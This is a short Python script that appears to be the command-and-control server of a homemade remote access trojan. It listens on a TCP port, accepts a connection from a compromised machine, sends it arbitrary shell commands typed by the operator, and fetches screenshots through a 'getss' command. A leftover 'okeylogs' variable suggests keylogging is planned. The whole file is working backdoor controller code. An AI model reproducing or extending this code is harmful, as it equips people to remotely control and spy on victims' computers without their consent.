import socket, gimmess, threading

HOST = "192.168.24.5"
#HOST = "172.16.120.153"
PORT = 5678

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()

opSys = conn.recv(1024).decode()
print(opSys)

okeylogs = ""

if opSys.lower() == "linux":
    while True:
        comm = input("Command : ")
        if comm == "getss":
            conn.send(bytes(comm, encoding = "utf8"))
            print(conn.recv(1024).decode())
            
            reciever = gimmess.ssdede(HOST, 6677)
            reciever.recieve()

            '''t = threading.Thread(target = r)
            t.start()
            t.join()'''
        else:
            conn.send(bytes(comm, encoding = "utf8"))
            print(conn.recv(1024).decode())

elif opSys.lower() == "windows":
    print("its windows....")
